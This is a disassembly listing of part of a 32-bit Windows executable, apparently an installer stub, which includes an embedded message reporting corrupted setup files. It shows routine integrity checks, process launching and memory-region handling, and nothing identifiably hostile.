  40945c:	a1 c8 bd 40 00       	mov    0x40bdc8,%eax
  409461:	8d 44 f0 18          	lea    0x18(%eax,%esi,8),%eax
  409465:	e8 b6 9f ff ff       	call   0x403420
  40946a:	5a                   	pop    %edx
  40946b:	e8 e8 f6 ff ff       	call   0x408b58
  409470:	89 1d 38 a2 40 00    	mov    %ebx,0x40a238
  409476:	5e                   	pop    %esi
  409477:	5b                   	pop    %ebx
  409478:	c3                   	ret
  409479:	8d 40 00             	lea    0x0(%eax),%eax
  40947c:	53                   	push   %ebx
  40947d:	56                   	push   %esi
  40947e:	57                   	push   %edi
  40947f:	55                   	push   %ebp
  409480:	83 3d a4 bc 40 00 00 	cmpl   $0x0,0x40bca4
  409487:	74 3a                	je     0x4094c3
  409489:	8b 3d cc bd 40 00    	mov    0x40bdcc,%edi
  40948f:	4f                   	dec    %edi
  409490:	85 ff                	test   %edi,%edi
  409492:	7c 2f                	jl     0x4094c3
  409494:	47                   	inc    %edi
  409495:	33 f6                	xor    %esi,%esi
  409497:	8b c6                	mov    %esi,%eax
  409499:	c1 e0 03             	shl    $0x3,%eax
  40949c:	8b 15 c8 bd 40 00    	mov    0x40bdc8,%edx
  4094a2:	8b 14 c2             	mov    (%edx,%eax,8),%edx
  4094a5:	a1 a4 bc 40 00       	mov    0x40bca4,%eax
  4094aa:	e8 e1 b6 ff ff       	call   0x404b90
  4094af:	85 c0                	test   %eax,%eax
  4094b1:	75 0c                	jne    0x4094bf
  4094b3:	8b c6                	mov    %esi,%eax
  4094b5:	e8 76 ff ff ff       	call   0x409430
  4094ba:	e9 c5 00 00 00       	jmp    0x409584
  4094bf:	46                   	inc    %esi
  4094c0:	4f                   	dec    %edi
  4094c1:	75 d4                	jne    0x409497
  4094c3:	a0 bc bd 40 00       	mov    0x40bdbc,%al
  4094c8:	2c 01                	sub    $0x1,%al
  4094ca:	72 04                	jb     0x4094d0
  4094cc:	74 0b                	je     0x4094d9
  4094ce:	eb 12                	jmp    0x4094e2
  4094d0:	e8 27 d9 ff ff       	call   0x406dfc
  4094d5:	8b e8                	mov    %eax,%ebp
  4094d7:	eb 0b                	jmp    0x4094e4
  4094d9:	e8 9e af ff ff       	call   0x40447c
  4094de:	8b e8                	mov    %eax,%ebp
  4094e0:	eb 02                	jmp    0x4094e4
  4094e2:	33 ed                	xor    %ebp,%ebp
  4094e4:	66 85 ed             	test   %bp,%bp
  4094e7:	0f 84 90 00 00 00    	je     0x40957d
  4094ed:	8b 3d cc bd 40 00    	mov    0x40bdcc,%edi
  4094f3:	4f                   	dec    %edi
  4094f4:	85 ff                	test   %edi,%edi
  4094f6:	7c 36                	jl     0x40952e
  4094f8:	47                   	inc    %edi
  4094f9:	33 f6                	xor    %esi,%esi
  4094fb:	8b c6                	mov    %esi,%eax
  4094fd:	c1 e0 03             	shl    $0x3,%eax
  409500:	8b 15 c8 bd 40 00    	mov    0x40bdc8,%edx
  409506:	8d 1c c2             	lea    (%edx,%eax,8),%ebx
  409509:	0f b7 c5             	movzwl %bp,%eax
  40950c:	3b 43 28             	cmp    0x28(%ebx),%eax
  40950f:	75 19                	jne    0x40952a
  409511:	83 7b 2c 00          	cmpl   $0x0,0x2c(%ebx)
  409515:	74 0a                	je     0x409521
  409517:	e8 e8 ae ff ff       	call   0x404404
  40951c:	3b 43 2c             	cmp    0x2c(%ebx),%eax
  40951f:	75 09                	jne    0x40952a
  409521:	8b c6                	mov    %esi,%eax
  409523:	e8 08 ff ff ff       	call   0x409430
  409528:	eb 5a                	jmp    0x409584
  40952a:	46                   	inc    %esi
  40952b:	4f                   	dec    %edi
  40952c:	75 cd                	jne    0x4094fb
  40952e:	8b 3d cc bd 40 00    	mov    0x40bdcc,%edi
  409534:	4f                   	dec    %edi
  409535:	85 ff                	test   %edi,%edi
  409537:	7c 44                	jl     0x40957d
  409539:	47                   	inc    %edi
  40953a:	33 f6                	xor    %esi,%esi
  40953c:	8b c6                	mov    %esi,%eax
  40953e:	c1 e0 03             	shl    $0x3,%eax
  409541:	8b 15 c8 bd 40 00    	mov    0x40bdc8,%edx
  409547:	8d 1c c2             	lea    (%edx,%eax,8),%ebx
  40954a:	8b 43 28             	mov    0x28(%ebx),%eax
  40954d:	25 ff 03 00 00       	and    $0x3ff,%eax
  409552:	8b d5                	mov    %ebp,%edx
  409554:	66 81 e2 ff 03       	and    $0x3ff,%dx
  409559:	0f b7 d2             	movzwl %dx,%edx
  40955c:	3b c2                	cmp    %edx,%eax
  40955e:	75 19                	jne    0x409579
  409560:	83 7b 2c 00          	cmpl   $0x0,0x2c(%ebx)
  409564:	74 0a                	je     0x409570
  409566:	e8 99 ae ff ff       	call   0x404404
  40956b:	3b 43 2c             	cmp    0x2c(%ebx),%eax
  40956e:	75 09                	jne    0x409579
  409570:	8b c6                	mov    %esi,%eax
  409572:	e8 b9 fe ff ff       	call   0x409430
  409577:	eb 0b                	jmp    0x409584
  409579:	46                   	inc    %esi
  40957a:	4f                   	dec    %edi
  40957b:	75 bf                	jne    0x40953c
  40957d:	33 c0                	xor    %eax,%eax
  40957f:	e8 ac fe ff ff       	call   0x409430
  409584:	5d                   	pop    %ebp
  409585:	5f                   	pop    %edi
  409586:	5e                   	pop    %esi
  409587:	5b                   	pop    %ebx
  409588:	c3                   	ret
  409589:	8d 40 00             	lea    0x0(%eax),%eax
  40958c:	55                   	push   %ebp
  40958d:	8b ec                	mov    %esp,%ebp
  40958f:	51                   	push   %ecx
  409590:	53                   	push   %ebx
  409591:	56                   	push   %esi
  409592:	57                   	push   %edi
  409593:	8b 45 0c             	mov    0xc(%ebp),%eax
  409596:	33 d2                	xor    %edx,%edx
  409598:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40959b:	8b d0                	mov    %eax,%edx
  40959d:	83 ea 11             	sub    $0x11,%edx
  4095a0:	74 73                	je     0x409615
  4095a2:	81 ea 85 04 00 00    	sub    $0x485,%edx
  4095a8:	74 02                	je     0x4095ac
  4095aa:	eb 4e                	jmp    0x4095fa
  4095ac:	81 7d 10 10 27 00 00 	cmpl   $0x2710,0x10(%ebp)
  4095b3:	75 10                	jne    0x4095c5
  4095b5:	c6 05 44 a2 40 00 01 	movb   $0x1,0x40a244
  4095bc:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4095c3:	eb 50                	jmp    0x409615
  4095c5:	81 7d 10 11 27 00 00 	cmpl   $0x2711,0x10(%ebp)
  4095cc:	75 47                	jne    0x409615
  4095ce:	33 c0                	xor    %eax,%eax
  4095d0:	55                   	push   %ebp
  4095d1:	68 ee 95 40 00       	push   $0x4095ee
  4095d6:	64 ff 30             	push   %fs:(%eax)
  4095d9:	64 89 20             	mov    %esp,%fs:(%eax)
  4095dc:	8b 45 14             	mov    0x14(%ebp),%eax
  4095df:	e8 4c fe ff ff       	call   0x409430
  4095e4:	33 c0                	xor    %eax,%eax
  4095e6:	5a                   	pop    %edx
  4095e7:	59                   	pop    %ecx
  4095e8:	59                   	pop    %ecx
  4095e9:	64 89 10             	mov    %edx,%fs:(%eax)
  4095ec:	eb 27                	jmp    0x409615
  4095ee:	e9 15 96 ff ff       	jmp    0x402c08
  4095f3:	e8 2c 99 ff ff       	call   0x402f24
  4095f8:	eb 1b                	jmp    0x409615
  4095fa:	8b 55 14             	mov    0x14(%ebp),%edx
  4095fd:	52                   	push   %edx
  4095fe:	8b 55 10             	mov    0x10(%ebp),%edx
  409601:	52                   	push   %edx
  409602:	50                   	push   %eax
  409603:	8b 45 08             	mov    0x8(%ebp),%eax
  409606:	50                   	push   %eax
  409607:	a1 d0 bd 40 00       	mov    0x40bdd0,%eax
  40960c:	50                   	push   %eax
  40960d:	e8 0a af ff ff       	call   0x40451c
  409612:	89 45 fc             	mov    %eax,-0x4(%ebp)
  409615:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409618:	5f                   	pop    %edi
  409619:	5e                   	pop    %esi
  40961a:	5b                   	pop    %ebx
  40961b:	59                   	pop    %ecx
  40961c:	5d                   	pop    %ebp
  40961d:	c2 10 00             	ret    $0x10
  409620:	55                   	push   %ebp
  409621:	8b ec                	mov    %esp,%ebp
  409623:	83 c4 88             	add    $0xffffff88,%esp
  409626:	53                   	push   %ebx
  409627:	56                   	push   %esi
  409628:	57                   	push   %edi
  409629:	33 db                	xor    %ebx,%ebx
  40962b:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40962e:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  409631:	8b fa                	mov    %edx,%edi
  409633:	8b f0                	mov    %eax,%esi
  409635:	8d 5d 88             	lea    -0x78(%ebp),%ebx
  409638:	33 c0                	xor    %eax,%eax
  40963a:	55                   	push   %ebp
  40963b:	68 10 97 40 00       	push   $0x409710
  409640:	64 ff 30             	push   %fs:(%eax)
  409643:	64 89 20             	mov    %esp,%fs:(%eax)
  409646:	68 28 97 40 00       	push   $0x409728
  40964b:	56                   	push   %esi
  40964c:	68 34 97 40 00       	push   $0x409734
  409651:	57                   	push   %edi
  409652:	8d 45 f8             	lea    -0x8(%ebp),%eax
  409655:	ba 04 00 00 00       	mov    $0x4,%edx
  40965a:	e8 55 9d ff ff       	call   0x4033b4
  40965f:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  409662:	33 c9                	xor    %ecx,%ecx
  409664:	ba 44 00 00 00       	mov    $0x44,%edx
  409669:	e8 0e 91 ff ff       	call   0x40277c
  40966e:	c7 45 b4 44 00 00 00 	movl   $0x44,-0x4c(%ebp)
  409675:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  409678:	50                   	push   %eax
  409679:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  40967c:	50                   	push   %eax
  40967d:	6a 00                	push   $0x0
  40967f:	6a 00                	push   $0x0
  409681:	6a 00                	push   $0x0
  409683:	6a 00                	push   $0x0
  409685:	6a 00                	push   $0x0
  409687:	6a 00                	push   $0x0
  409689:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40968c:	e8 83 9d ff ff       	call   0x403414
  409691:	50                   	push   %eax
  409692:	6a 00                	push   $0x0
  409694:	e8 43 ad ff ff       	call   0x4043dc
  409699:	85 c0                	test   %eax,%eax
  40969b:	75 07                	jne    0x4096a4
  40969d:	b0 62                	mov    $0x62,%al
  40969f:	e8 94 fb ff ff       	call   0x409238
  4096a4:	8b 45 a8             	mov    -0x58(%ebp),%eax
  4096a7:	50                   	push   %eax
  4096a8:	e8 17 ad ff ff       	call   0x4043c4
  4096ad:	eb 0c                	jmp    0x4096bb
  4096af:	53                   	push   %ebx
  4096b0:	e8 bf ae ff ff       	call   0x404574
  4096b5:	53                   	push   %ebx
  4096b6:	e8 81 ae ff ff       	call   0x40453c
  4096bb:	6a 01                	push   $0x1
  4096bd:	6a 00                	push   $0x0
  4096bf:	6a 00                	push   $0x0
  4096c1:	6a 00                	push   $0x0
  4096c3:	53                   	push   %ebx
  4096c4:	e8 9b ae ff ff       	call   0x404564
  4096c9:	85 c0                	test   %eax,%eax
  4096cb:	75 e2                	jne    0x4096af
  4096cd:	68 ff 00 00 00       	push   $0xff
  4096d2:	6a ff                	push   $0xffffffff
  4096d4:	6a 00                	push   $0x0
  4096d6:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  4096d9:	50                   	push   %eax
  4096da:	6a 01                	push   $0x1
  4096dc:	e8 7b ae ff ff       	call   0x40455c
  4096e1:	48                   	dec    %eax
  4096e2:	74 d7                	je     0x4096bb
  4096e4:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4096e7:	50                   	push   %eax
  4096e8:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  4096eb:	50                   	push   %eax
  4096ec:	e8 33 ad ff ff       	call   0x404424
  4096f1:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  4096f4:	50                   	push   %eax
  4096f5:	e8 ca ac ff ff       	call   0x4043c4
  4096fa:	33 c0                	xor    %eax,%eax
  4096fc:	5a                   	pop    %edx
  4096fd:	59                   	pop    %ecx
  4096fe:	59                   	pop    %ecx
  4096ff:	64 89 10             	mov    %edx,%fs:(%eax)
  409702:	68 17 97 40 00       	push   $0x409717
  409707:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40970a:	e8 89 9a ff ff       	call   0x403198
  40970f:	c3                   	ret
  409710:	e9 e7 96 ff ff       	jmp    0x402dfc
  409715:	eb f0                	jmp    0x409707
  409717:	5f                   	pop    %edi
  409718:	5e                   	pop    %esi
  409719:	5b                   	pop    %ebx
  40971a:	8b e5                	mov    %ebp,%esp
  40971c:	5d                   	pop    %ebp
  40971d:	c3                   	ret
  40971e:	00 00                	add    %al,(%eax)
  409720:	ff                   	(bad)
  409721:	ff                   	(bad)
  409722:	ff                   	(bad)
  409723:	ff 01                	incl   (%ecx)
  409725:	00 00                	add    %al,(%eax)
  409727:	00 22                	add    %ah,(%edx)
  409729:	00 00                	add    %al,(%eax)
  40972b:	00 ff                	add    %bh,%bh
  40972d:	ff                   	(bad)
  40972e:	ff                   	(bad)
  40972f:	ff 02                	incl   (%edx)
  409731:	00 00                	add    %al,(%eax)
  409733:	00 22                	add    %ah,(%edx)
  409735:	20 00                	and    %al,(%eax)
  409737:	00 83 3d b0 bb 40    	add    %al,0x40bbb03d(%ebx)
  40973d:	00 00                	add    %al,(%eax)
  40973f:	74 18                	je     0x409759
  409741:	8b 0d b0 bb 40 00    	mov    0x40bbb0,%ecx
  409747:	b2 01                	mov    $0x1,%dl
  409749:	b8 b0 45 40 00       	mov    $0x4045b0,%eax
  40974e:	e8 8d c0 ff ff       	call   0x4057e0
  409753:	e8 5c 97 ff ff       	call   0x402eb4
  409758:	c3                   	ret
  409759:	b9 78 97 40 00       	mov    $0x409778,%ecx
  40975e:	b2 01                	mov    $0x1,%dl
  409760:	b8 b0 45 40 00       	mov    $0x4045b0,%eax
  409765:	e8 76 c0 ff ff       	call   0x4057e0
  40976a:	e8 45 97 ff ff       	call   0x402eb4
  40976f:	c3                   	ret
  409770:	ff                   	(bad)
  409771:	ff                   	(bad)
  409772:	ff                   	(bad)
  409773:	ff 47 00             	incl   0x0(%edi)
  409776:	00 00                	add    %al,(%eax)
  409778:	54                   	push   %esp
  409779:	68 65 20 73 65       	push   $0x65732065
  40977e:	74 75                	je     0x4097f5
  409780:	70 20                	jo     0x4097a2
  409782:	66 69 6c 65 73 20 61 	imul   $0x6120,0x73(%ebp,%eiz,2),%bp
  409789:	72 65                	jb     0x4097f0
  40978b:	20 63 6f             	and    %ah,0x6f(%ebx)
  40978e:	72 72                	jb     0x409802
  409790:	75 70                	jne    0x409802
  409792:	74 65                	je     0x4097f9
  409794:	64 2e 20 50 6c       	fs and %dl,%cs:0x6c(%eax)
  409799:	65 61                	gs popa
  40979b:	73 65                	jae    0x409802
  40979d:	20 6f 62             	and    %ch,0x62(%edi)
  4097a0:	74 61                	je     0x409803
  4097a2:	69 6e 20 61 20 6e 65 	imul   $0x656e2061,0x20(%esi),%ebp
  4097a9:	77 20                	ja     0x4097cb
  4097ab:	63 6f 70             	arpl   %ebp,0x70(%edi)
  4097ae:	79 20                	jns    0x4097d0
  4097b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4097b1:	66 20 74 68 65       	data16 and %dh,0x65(%eax,%ebp,2)
  4097b6:	20 70 72             	and    %dh,0x72(%eax)
  4097b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4097ba:	67 72 61             	addr16 jb 0x40981e
  4097bd:	6d                   	insl   (%dx),%es:(%edi)
  4097be:	2e 00 31             	add    %dh,%cs:(%ecx)
  4097c1:	d2 f0                	shl    %cl,%al
  4097c3:	09 10                	or     %edx,(%eax)
  4097c5:	c3                   	ret
  4097c6:	8b c0                	mov    %eax,%eax
  4097c8:	53                   	push   %ebx
  4097c9:	56                   	push   %esi
  4097ca:	57                   	push   %edi
  4097cb:	55                   	push   %ebp
  4097cc:	83 c4 bc             	add    $0xffffffbc,%esp
  4097cf:	8b f8                	mov    %eax,%edi
  4097d1:	8d 74 24 28          	lea    0x28(%esp),%esi
  4097d5:	8d 44 24 04          	lea    0x4(%esp),%eax
  4097d9:	50                   	push   %eax
  4097da:	e8 95 ac ff ff       	call   0x404474
  4097df:	8b df                	mov    %edi,%ebx
  4097e1:	6a 1c                	push   $0x1c
  4097e3:	56                   	push   %esi
  4097e4:	53                   	push   %ebx
  4097e5:	e8 22 ad ff ff       	call   0x40450c
  4097ea:	85 c0                	test   %eax,%eax
  4097ec:	0f 84 8a 00 00 00    	je     0x40987c
  4097f2:	eb 7d                	jmp    0x409871
  4097f4:	81 7e 10 00 10 00 00 	cmpl   $0x1000,0x10(%esi)
  4097fb:	75 60                	jne    0x40985d
  4097fd:	f6 46 15 01          	testb  $0x1,0x15(%esi)
  409801:	75 5a                	jne    0x40985d
  409803:	33 db                	xor    %ebx,%ebx
  409805:	8b 46 14             	mov    0x14(%esi),%eax
  409808:	83 f8 01             	cmp    $0x1,%eax
  40980b:	74 0f                	je     0x40981c
  40980d:	83 f8 02             	cmp    $0x2,%eax
  409810:	74 0a                	je     0x40981c
  409812:	83 f8 10             	cmp    $0x10,%eax
  409815:	74 05                	je     0x40981c
  409817:	83 f8 20             	cmp    $0x20,%eax
  40981a:	75 15                	jne    0x409831
  40981c:	54                   	push   %esp
  40981d:	6a 40                	push   $0x40
  40981f:	8b 46 0c             	mov    0xc(%esi),%eax
  409822:	50                   	push   %eax
  409823:	8b 06                	mov    (%esi),%eax
  409825:	50                   	push   %eax
  409826:	e8 d9 ac ff ff       	call   0x404504
  40982b:	85 c0                	test   %eax,%eax
  40982d:	74 02                	je     0x409831
  40982f:	b3 01                	mov    $0x1,%bl
  409831:	33 ed                	xor    %ebp,%ebp
  409833:	eb 0d                	jmp    0x409842
  409835:	8b 06                	mov    (%esi),%eax
  409837:	03 c5                	add    %ebp,%eax
  409839:	e8 82 ff ff ff       	call   0x4097c0
  40983e:	03 6c 24 08          	add    0x8(%esp),%ebp
  409842:	3b 6e 0c             	cmp    0xc(%esi),%ebp
  409845:	72 ee                	jb     0x409835
  409847:	84 db                	test   %bl,%bl
  409849:	74 12                	je     0x40985d
  40984b:	54                   	push   %esp
  40984c:	8b 44 24 04          	mov    0x4(%esp),%eax
  409850:	50                   	push   %eax
  409851:	8b 46 0c             	mov    0xc(%esi),%eax
  409854:	50                   	push   %eax
  409855:	8b 06                	mov    (%esi),%eax
  409857:	50                   	push   %eax
  409858:	e8 a7 ac ff ff       	call   0x404504
  40985d:	8b 06                	mov    (%esi),%eax
  40985f:	03 46 0c             	add    0xc(%esi),%eax
  409862:	89 c3                	mov    %eax,%ebx
  409864:	6a 1c                	push   $0x1c
  409866:	56                   	push   %esi
  409867:	53                   	push   %ebx
  409868:	e8 9f ac ff ff       	call   0x40450c
  40986d:	85 c0                	test   %eax,%eax
  40986f:	74 0b                	je     0x40987c
  409871:	8b 46 04             	mov    0x4(%esi),%eax
  409874:	3b c7                	cmp    %edi,%eax
  409876:	0f 84 78 ff ff ff    	je     0x4097f4
  40987c:	83 c4 44             	add    $0x44,%esp
  40987f:	5d                   	pop    %ebp
  409880:	5f                   	pop    %edi
  409881:	5e                   	pop    %esi
  409882:	5b                   	pop    %ebx
  409883:	c3                   	ret
  409884:	53                   	push   %ebx
  409885:	6a 0a                	push   $0xa
  409887:	68 67 2b 00 00       	push   $0x2b67
  40988c:	6a 00                	push   $0x0
  40988e:	e8 59 ab ff ff       	call   0x4043ec
  409893:	8b d8                	mov    %eax,%ebx
  409895:	85 db                	test   %ebx,%ebx
  409897:	75 05                	jne    0x40989e
  409899:	e8 9a fe ff ff       	call   0x409738
  40989e:	53                   	push   %ebx
  40989f:	6a 00                	push   $0x0
  4098a1:	e8 3e ac ff ff       	call   0x4044e4
  4098a6:	83 f8 2c             	cmp    $0x2c,%eax
  4098a9:	74 05                	je     0x4098b0
  4098ab:	e8 88 fe ff ff       	call   0x409738
  4098b0:	53                   	push   %ebx
  4098b1:	6a 00                	push   $0x0
  4098b3:	e8 ec ab ff ff       	call   0x4044a4
  4098b8:	8b d8                	mov    %eax,%ebx
  4098ba:	85 db                	test   %ebx,%ebx
  4098bc:	75 05                	jne    0x4098c3
  4098be:	e8 75 fe ff ff       	call   0x409738
  4098c3:	53                   	push   %ebx
  4098c4:	e8 e3 ab ff ff       	call   0x4044ac
  4098c9:	8b d8                	mov    %eax,%ebx
  4098cb:	85 db                	test   %ebx,%ebx
  4098cd:	75 05                	jne    0x4098d4
  4098cf:	e8 64 fe ff ff       	call   0x409738
  4098d4:	8b c3                	mov    %ebx,%eax
  4098d6:	5b                   	pop    %ebx
  4098d7:	c3                   	ret
  4098d8:	55                   	push   %ebp
  4098d9:	8b ec                	mov    %esp,%ebp
  4098db:	83 c4 cc             	add    $0xffffffcc,%esp
  4098de:	53                   	push   %ebx
  4098df:	56                   	push   %esi
  4098e0:	57                   	push   %edi
  4098e1:	33 c0                	xor    %eax,%eax
  4098e3:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4098e6:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4098e9:	e8 ee 97 ff ff       	call   0x4030dc
  4098ee:	e8 f5 a9 ff ff       	call   0x4042e8
  4098f3:	e8 20 cc ff ff       	call   0x406518
  4098f8:	e8 67 cc ff ff       	call   0x406564
  4098fd:	e8 0a f3 ff ff       	call   0x408c0c
  409902:	e8 71 f4 ff ff       	call   0x408d78
  409907:	33 c0                	xor    %eax,%eax
  409909:	55                   	push   %ebp
  40990a:	68 82 9f 40 00       	push   $0x409f82
  40990f:	64 ff 30             	push   %fs:(%eax)
  409912:	64 89 20             	mov    %esp,%fs:(%eax)
  409915:	33 d2                	xor    %edx,%edx
  409917:	55                   	push   %ebp
  409918:	68 38 9f 40 00       	push   $0x409f38
  40991d:	64 ff 32             	push   %fs:(%edx)
  409920:	64 89 22             	mov    %esp,%fs:(%edx)
  409923:	a1 14 b0 40 00       	mov    0x40b014,%eax
  409928:	e8 9b fe ff ff       	call   0x4097c8
  40992d:	e8 26 fa ff ff       	call   0x409358
  409932:	8d 55 f0             	lea    -0x10(%ebp),%edx
  409935:	33 c0                	xor    %eax,%eax
  409937:	e8 e0 d0 ff ff       	call   0x406a1c
  40993c:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40993f:	b8 d4 bd 40 00       	mov    $0x40bdd4,%eax
  409944:	e8 9f 98 ff ff       	call   0x4031e8
  409949:	6a 02                	push   $0x2
  40994b:	6a 00                	push   $0x0
  40994d:	6a 01                	push   $0x1
  40994f:	8b 0d d4 bd 40 00    	mov    0x40bdd4,%ecx
  409955:	b2 01                	mov    $0x1,%dl
  409957:	b8 58 71 40 00       	mov    $0x407158,%eax
  40995c:	e8 4b d9 ff ff       	call   0x4072ac
  409961:	a3 d8 bd 40 00       	mov    %eax,0x40bdd8
  409966:	33 d2                	xor    %edx,%edx
  409968:	55                   	push   %ebp
  409969:	68 16 9f 40 00       	push   $0x409f16
  40996e:	64 ff 32             	push   %fs:(%edx)
  409971:	64 89 22             	mov    %esp,%fs:(%edx)
  409974:	e8 0b ff ff ff       	call   0x409884
  409979:	a3 e0 bd 40 00       	mov    %eax,0x40bde0
  40997e:	a1 e0 bd 40 00       	mov    0x40bde0,%eax
  409983:	83 78 0c 01          	cmpl   $0x1,0xc(%eax)
  409987:	75 48                	jne    0x4099d1
  409989:	a1 e0 bd 40 00       	mov    0x40bde0,%eax
  40998e:	ba 28 00 00 00       	mov    $0x28,%edx
  409993:	e8 4c dd ff ff       	call   0x4076e4
  409998:	8b 15 e0 bd 40 00    	mov    0x40bde0,%edx
  40999e:	3b 42 28             	cmp    0x28(%edx),%eax
  4099a1:	75 2e                	jne    0x4099d1
  4099a3:	8d 55 e8             	lea    -0x18(%ebp),%edx
  4099a6:	a1 d8 bd 40 00       	mov    0x40bdd8,%eax
  4099ab:	8b 08                	mov    (%eax),%ecx
  4099ad:	ff 51 04             	call   *0x4(%ecx)
  4099b0:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  4099b4:	75 20                	jne    0x4099d6
  4099b6:	8d 55 e0             	lea    -0x20(%ebp),%edx
  4099b9:	a1 d8 bd 40 00       	mov    0x40bdd8,%eax
  4099be:	8b 08                	mov    (%eax),%ecx
  4099c0:	ff 51 04             	call   *0x4(%ecx)
  4099c3:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4099c6:	8b 15 e0 bd 40 00    	mov    0x40bde0,%edx
  4099cc:	3b 42 10             	cmp    0x10(%edx),%eax
  4099cf:	73 05                	jae    0x4099d6
  4099d1:	e8 62 fd ff ff       	call   0x409738
  4099d6:	a1 e0 bd 40 00       	mov    0x40bde0,%eax
  4099db:	8b 50 20             	mov    0x20(%eax),%edx
  4099de:	a1 d8 bd 40 00       	mov    0x40bdd8,%eax
  4099e3:	e8 ac d8 ff ff       	call   0x407294
  4099e8:	ba ec bd 40 00       	mov    $0x40bdec,%edx
  4099ed:	b9 40 00 00 00       	mov    $0x40,%ecx
  4099f2:	a1 d8 bd 40 00       	mov    0x40bdd8,%eax
  4099f7:	e8 70 d8 ff ff       	call   0x40726c
  4099fc:	b8 ec bd 40 00       	mov    $0x40bdec,%eax
  409a01:	ba 88 a1 40 00       	mov    $0x40a188,%edx
  409a06:	b9 40 00 00 00       	mov    $0x40,%ecx
  409a0b:	e8 fc 8c ff ff       	call   0x40270c
  409a10:	74 05                	je     0x409a17
  409a12:	e8 21 fd ff ff       	call   0x409738
  409a17:	33 c0                	xor    %eax,%eax
  409a19:	55                   	push   %ebp
  409a1a:	68 db 9a 40 00       	push   $0x409adb
  409a1f:	64 ff 30             	push   %fs:(%eax)
  409a22:	64 89 20             	mov    %esp,%fs:(%eax)
  409a25:	68 b0 7a 40 00       	push   $0x407ab0
  409a2a:	8b 0d d8 bd 40 00    	mov    0x40bdd8,%ecx
  409a30:	b2 01                	mov    $0x1,%dl
  409a32:	b8 44 76 40 00       	mov    $0x407644,%eax
  409a37:	e8 44 dd ff ff       	call   0x407780
  409a3c:	a3 30 be 40 00       	mov    %eax,0x40be30
  409a41:	33 c0                	xor    %eax,%eax
  409a43:	55                   	push   %ebp
  409a44:	68 ca 9a 40 00       	push   $0x409aca
  409a49:	64 ff 30             	push   %fs:(%eax)
  409a4c:	64 89 20             	mov    %esp,%fs:(%eax)
  409a4f:	6a 1b                	push   $0x1b
  409a51:	ba a8 bc 40 00       	mov    $0x40bca8,%edx
  409a56:	b9 1e 01 00 00       	mov    $0x11e,%ecx
  409a5b:	a1 30 be 40 00       	mov    0x40be30,%eax
  409a60:	e8 fb ed ff ff       	call   0x408860
  409a65:	a1 34 bd 40 00       	mov    0x40bd34,%eax
  409a6a:	a3 cc bd 40 00       	mov    %eax,0x40bdcc
  409a6f:	a1 cc bd 40 00       	mov    0x40bdcc,%eax
  409a74:	c1 e0 06             	shl    $0x6,%eax
  409a77:	e8 f4 b0 ff ff       	call   0x404b70
  409a7c:	a3 c8 bd 40 00       	mov    %eax,0x40bdc8
  409a81:	8b 1d cc bd 40 00    	mov    0x40bdcc,%ebx
  409a87:	4b                   	dec    %ebx
  409a88:	85 db                	test   %ebx,%ebx
  409a8a:	7c 26                	jl     0x409ab2
  409a8c:	43                   	inc    %ebx
  409a8d:	33 f6                	xor    %esi,%esi
  409a8f:	6a 0a                	push   $0xa
  409a91:	8b c6                	mov    %esi,%eax
  409a93:	c1 e0 03             	shl    $0x3,%eax
  409a96:	8b 15 c8 bd 40 00    	mov    0x40bdc8,%edx
  409a9c:	8d 14 c2             	lea    (%edx,%eax,8),%edx
  409a9f:	b9 40 00 00 00       	mov    $0x40,%ecx
  409aa4:	a1 30 be 40 00       	mov    0x40be30,%eax
  409aa9:	e8 b2 ed ff ff       	call   0x408860
  409aae:	46                   	inc    %esi
  409aaf:	4b                   	dec    %ebx
  409ab0:	75 dd                	jne    0x409a8f
  409ab2:	33 c0                	xor    %eax,%eax
  409ab4:	5a                   	pop    %edx
  409ab5:	59                   	pop    %ecx
  409ab6:	59                   	pop    %ecx
  409ab7:	64 89 10             	mov    %edx,%fs:(%eax)
  409aba:	68 d1 9a 40 00       	push   $0x409ad1
  409abf:	a1 30 be 40 00       	mov    0x40be30,%eax
  409ac4:	e8 5b 8e ff ff       	call   0x402924
  409ac9:	c3                   	ret
  409aca:	e9 2d 93 ff ff       	jmp    0x402dfc
  409acf:	eb ee                	jmp    0x409abf
  409ad1:	33 c0                	xor    %eax,%eax
  409ad3:	5a                   	pop    %edx
  409ad4:	59                   	pop    %ecx
  409ad5:	59                   	pop    %ecx
  409ad6:	64 89 10             	mov    %edx,%fs:(%eax)
  409ad9:	eb 1b                	jmp    0x409af6
  409adb:	e9 ec 91 ff ff       	jmp    0x402ccc
  409ae0:	01 00                	add    %eax,(%eax)
  409ae2:	00 00                	add    %al,(%eax)
  409ae4:	4c                   	dec    %esp
  409ae5:	75 40                	jne    0x409b27
  409ae7:	00 ec                	add    %ch,%ah
  409ae9:	9a 40 00 e8 47 fc ff 	lcall  $0xfffc,$0x47e80040
  409af0:	ff                   	ljmp   (bad)
  409af1:	e8 2e 94 ff ff       	call   0x402f24
  409af6:	e8 81 f9 ff ff       	call   0x40947c
  409afb:	83 3d 7c a0 40 00 00 	cmpl   $0x0,0x40a07c
  409b02:	75 31                	jne    0x409b35
  409b04:	6a 10                	push   $0x10
  409b06:	a1 6c ba 40 00       	mov    0x40ba6c,%eax
  409b0b:	e8 04 99 ff ff       	call   0x403414
  409b10:	50                   	push   %eax
  409b11:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  409b14:	ba a0 9f 40 00       	mov    $0x409fa0,%edx
  409b19:	b0 6c                	mov    $0x6c,%al
  409b1b:	e8 90 ef ff ff       	call   0x408ab0
